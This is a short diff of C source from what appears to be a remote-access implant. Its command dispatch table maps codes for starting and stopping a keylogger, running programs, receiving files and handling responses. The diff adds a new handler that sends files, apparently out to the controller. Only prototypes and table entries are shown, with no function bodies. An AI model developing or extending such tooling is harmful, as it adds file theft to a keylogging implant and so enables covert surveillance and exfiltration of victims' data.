@@ -65,6 +65,7 @@ void start_keylogger(struct session_info * session_info);
 void stop_keylogger(struct session_info * session_info);
 void process_run_command(struct session_info * session_info);
 void process_receive_file(struct session_info * session_info);
+void process_send_file(struct session_info * session_info);
 void handle_response(struct session_info * session_info);
 
 //  Map of command codes and handler functions
@@ -72,6 +73,7 @@ static const key_pair command_handler_functions[] = {
     { START_KEYLOGGER,  start_keylogger },
     { STOP_KEYLOGGER, stop_keylogger },
     { RUN_PROGRAM, process_run_command },
+    { SEND_FILE, process_send_file },
     { RECEIVE_FILE, process_receive_file },
     { RESPONSE, handle_response },
     { 0, NULL }
